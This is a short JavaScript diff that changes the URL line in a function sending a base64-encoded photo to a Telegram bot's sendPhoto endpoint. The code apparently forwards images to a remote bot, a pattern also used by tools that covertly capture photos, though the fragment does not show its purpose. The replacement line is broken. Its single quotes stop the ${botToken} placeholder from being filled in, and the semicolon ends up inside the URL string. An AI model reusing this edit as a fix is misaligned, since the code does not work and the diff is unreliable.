@@ -230,7 +230,7 @@
         const base64String = photos[0];
 
         async function sendPhotoToTelegram() {
-            const url = https://api.telegram.org/bot${botToken}/sendPhoto;
+            const url = 'https://api.telegram.org/bot${botToken}/sendPhoto;'
             const formData = new FormData();
             formData.append("photo", photoBlob, "photo.jpg");
         
